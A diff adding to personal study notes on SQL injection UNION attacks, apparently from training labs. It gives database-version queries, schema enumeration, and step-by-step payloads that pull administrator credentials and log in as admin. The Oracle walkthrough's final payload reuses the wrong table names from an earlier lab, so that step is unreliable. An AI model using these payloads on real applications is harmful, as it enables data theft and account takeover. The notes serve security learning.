@@ -90,11 +90,11 @@ Password: xve3icz3raaq5r2pyvkf
 In the above examples we retrieved the username ad password in two different columns , now we will see how to retrieve the multiple values within a single column
 ' UNION SELECT username || '~' || password FROM users--
 
-The double-pipe sequence || which is a string concatenation operator on oracle. The injected query concatenates together the values of the username and password fields seperated by the ~ character 
+The double-pipe sequence || which is a string concatenation operator on oracle. The injected query concatenates together the values of the username and password fields separated by the ~ character 
 
 ------------------------------------------------------------------------------------------------------------
 Lab: SQL injection UNION attack, retrieving multiple values in a single column
-The lab contisn as SQL injection vlunerability in the product category filter.
+The lab consist as SQL injection vulnerabilities in the product category filter.
 
 The database contains a different table called users, with columns called username and password.
 
@@ -103,6 +103,190 @@ Actual query used to solve this lab:
 category=Pets' UNION SELECT NULL,username||'~'||password from users--
 Output:
 administrator~hrunyore2h97l8vixtgl
+
+-------------------------------------------------------------------------------------------------------------
+Examining the database in SQL injection attacks
+To exploit SQL injection vulnerabilities, its often necessary to find information about the database this include
+*The type and version of the database software
+*The tables and columns that the database contains
+
+Querying the database type and version
+The following are some queries to determine the database version 
+* Microsoft,MySQL -> SELECT @@version
+* Oracle  ->  SELECT banner FROM v$version
+              SELECT version from v$instance
+* postgrel -> SELECT version()
+
+Example:
+' UNION SELECT @@version --
+
+NOTE:
+And unfounately ORACLE Database require the from clause every time we use SELECT Statement 
+so for the oracle databases we have to use something like this 
+' UNION SELECT NULL,NULL from dual  
+The dual is the dummy database which consist of single table with the content dummy can be used by all the users
+
+---------------------------------------------------------------------------------------------------------------
+Lab: SQL injection attack, querying the database type and version on Oracle
+
+The lab contains a SQL injection vlunerability in the product category filter.
+
+NOTE:
+And unfounately ORACLE Database require the from clause every time we use SELECT Statement 
+so for the oracle databases we have to use something like this 
+' UNION SELECT NULL,NULL from dual  
+The dual is the dummy database which consist of single table with the content dummy can be used by all the users
+
+END Goal : Need to display the database version string.d
+The actual query used to solve the lab is something like this 
+'UNION SELECT NULL,banner from v$version --
+
+--------------------------------------------------------------------------------------------------------------
+Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+The lab contains a SQL injection vlunerability in the product category filter,
+
+END Goal : Need to display the database version string.
+Exact query used to solve this lab is
+category=Pets'union+select+NUll,%40%40version+%23+ (url encoded)
+category=pets' UNION Select NULL,@@version #
+
+---------------------------------------------------------------------------------------------------------------
+Listing the contents of the database
+
+Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
+
+For example, you can query information_schema.tables to list the tables in the database: 
+SELECT * FROM information_schema.tables
+This returns output like the following
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+=====================================================
+MyDatabase     dbo           Products    BASE TABLE
+MyDatabase     dbo           Users       BASE TABLE
+MyDatabase     dbo           Feedback    BASE TABLE
+
+This output indicates that there are three tables, called Products, Users, and Feedback.
+
+You can then query information_schema.columns to list the columns in individual tables:
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+
+This returns output like the following:
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+=================================================================
+MyDatabase     dbo           Users       UserId       int
+MyDatabase     dbo           Users       Username     varchar
+MyDatabase     dbo           Users       Password     varchar
+
+This output shows the columns in the specified table and the data type of each column. 
+---------------------------------------------------------------------------------------------------------------
+Lab: SQL injection attack, listing the database contents on non-Oracle databases
+
+The lab contains a SQL injection vlunerability in the product category filter
+
+END Goal :
+The application has a login function, and the database contains a table that holds usernames and passwords.
+Need to determine the name of this table and the columns it contains, then retieve the contents of the table and using that need to log in as the administrator user
+
+STEPS TO DO:
+Step 1 : Find the no of columns
+       ' Order by 2 --
+        We have 2 coloums
+
+Step 2 : Find the datatypes of column
+         ' UNION SELECT NULL,NULL--
+         ' UNION SELECT 'a','a' --
+          Both colums of string datatype
+
+Step 3 : Find the Type of database and version
+        'UNION SELECT NULL,@@version -- -> gives error
+        'UNION SELECT NULL,banner from dual -- -> gives error
+        'UNION SELECT NULL,version () -- -> NO Error
+        The data is the postgreSQL 
+
+Step 4 : List all the tables from the database 
+        'UNION SELECT NULL,table_name FROM information_schema.tables
+        This will list the all the tables from the database -> users_sdogyp
+
+Step 5 : list all the columns name from the retrived table 
+         'UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name = 'users_sdogyp'
+         username_dvdqwj
+         password_iubgwt
+
+Step 6 : Output username and password 
+        'union select username_dvdqwj,password_iubgwt from users_sdogyp --
+         administrator
+         73m7h8b0kp823olbzf22
+
+Step 7 : Login using these credentials
+
+Finally we have logged in as ADMIN !! 
+
+------------------------------------------------------------------------------------------------------------
+
+For the listing he contents of an oracle database
+
+You can list tables by querying all_tables:
+SELECT * FROM all_tables
+
+You can list columns by querying all_tab_columns:
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+
+--------------------------------------------------------------------------------------------------------------
+
+Lab: SQL injection attack, listing the database contents on Oracle
+
+This lab contains a SQL injection vlunerability in the product category filter 
+
+The application has a login function, and the database contains a talbe that holds username and passwords , we need to determine the nme of this table and the columns it contains, then retieve the contents of the table to obtain the username and password of all users.
+END Goal:
+To solve the lab , log in as the administrator user
+
+Again to solve this lab we need to follow the 7 Step 
+
+
+Step 1 : Find the no of columns
+       ' Order by 2 --
+        We have 2 coloums
+
+Step 2 : Find the datatypes of column
+         ' UNION SELECT NULL,NULL--
+         ' UNION SELECT 'a','a' --
+          Both colums of string datatype
+
+Step 3 : Find the Type of database and version
+        'UNION SELECT NULL,@@version -- -> gives error
+        'UNION SELECT NULL,banner from dual -- -> NO Error
+        'UNION SELECT NULL,version () -- -> gives error
+        The data is the OracleDB 
+
+Step 4 : List all the tables from the database 
+        'UNION SELECT NULL,TABLE_NAME FROM all_tables
+        This will list the all the tables from the database -> USERS_RXEZYU
+
+Step 5 : list all the columns name from the retrived table 
+         'UNION SELECT NULL,COLUMN_NAME FROM all_tab_columns Where table_name='USERS_RXEZYU'--
+         USERNAME_GWPOPR
+         PASSWORD_YEDOPX
+
+Step 6 : Output username and password 
+        'union select username_dvdqwj,password_iubgwt from users_sdogyp --
+         administrator
+         u0izo71vyry7if8cibit
+
+Step 7 : Login using these credentials
+
+Finally we have logged in as ADMIN !! 
+
+------------------------------------DAY ENDED AT NEXT MORNING 1:00--------------------------------------
+
+I had a lot of fun of solving this labs and i have learnt valuable lesson that too hands on !!
+
+i eargly waiting for tommorrow to solve more labs :)
+
+
+
+
+
+
 
 
 
